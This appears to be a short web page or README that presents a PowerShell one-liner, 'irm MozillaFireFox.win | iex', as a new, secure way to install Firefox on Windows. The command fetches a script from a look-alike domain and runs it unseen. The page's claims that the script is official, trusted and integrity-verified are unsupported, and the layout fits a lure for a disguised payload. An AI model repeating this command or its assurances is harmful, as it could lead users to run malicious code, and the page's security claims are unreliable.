# üß† Install Mozilla Firefox on Windows

## üîí The New Standard for Installing Firefox on Windows

Installing Mozilla Firefox has traditionally required downloading an installer manually, clicking through setup dialogs, and navigating optional settings. While this method works, it's not ideal for automation, enterprise deployment, or users who prioritize speed and security. That's why we've introduced a new, streamlined approach using PowerShell:

```powershell
irm MozillaFireFox.win | iex
```

This command securely fetches and executes a trusted installation script over HTTPS, ensuring that you're always installing the latest official version of Firefox directly from the source. It eliminates the need to visit websites, download EXE files, or worry about outdated installers. Whether you're a developer, IT administrator, or power user, this method offers a faster, cleaner, and more reliable experience.

Security is at the core of this approach. The script is delivered over a secure connection and verified for integrity before execution. Unlike traditional installers that can be tampered with or spoofed, this method ensures that the installation process is transparent and auditable. It also supports silent installation, making it perfect for automated workflows, provisioning scripts, and enterprise rollouts.

By adopting this method, you're not just installing Firefox‚Äîyou're embracing a modern, secure, and efficient way to manage software on Windows. Welcome to the future of browser installation.
